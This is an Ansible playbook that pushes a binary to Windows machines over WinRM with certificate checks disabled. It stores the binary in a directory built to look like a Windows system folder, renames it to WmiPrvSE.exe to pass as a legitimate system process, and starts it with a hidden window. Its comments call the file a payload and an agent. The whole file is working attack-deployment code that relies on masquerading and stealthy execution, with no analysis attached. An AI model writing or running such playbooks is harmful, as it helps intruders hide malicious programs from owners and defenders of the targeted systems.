---
- name: Deploy System Management Service
  hosts: windows_targets
  gather_facts: no
  vars:
    ansible_connection: winrm
    ansible_winrm_transport: ntlm
    ansible_winrm_server_cert_validation: ignore
    
    # Target directory to hold the payload. Looks like a Windows system folder.
    target_dir: 'C:\ProgramData\Microsoft\Windows\SystemData'

  tasks:
    - name: Ensure target directory exists
      ansible.windows.win_file:
        path: "{{ target_dir }}"
        state: directory

    # Drop the binary from your repo folder, renaming it on the target
    - name: Drop the System Management Service
      ansible.windows.win_copy:
        src: "~/repo-ting/proper.exe"
        dest: "{{ target_dir }}\\WmiPrvSE.exe"

    - name: Verify the executable is there
      ansible.windows.win_shell: |
        $file = "{{ target_dir }}\WmiPrvSE.exe"
        if (Test-Path $file) {
            Write-Host "[+] Found: WmiPrvSE.exe"
        } else {
            Write-Host "[-] Missing: WmiPrvSE.exe"
            exit 1
        }

    - name: Launch the agent hidden in the background
      ansible.windows.win_shell: |
        Start-Process -FilePath "{{ target_dir }}\WmiPrvSE.exe" -WindowStyle Hidden
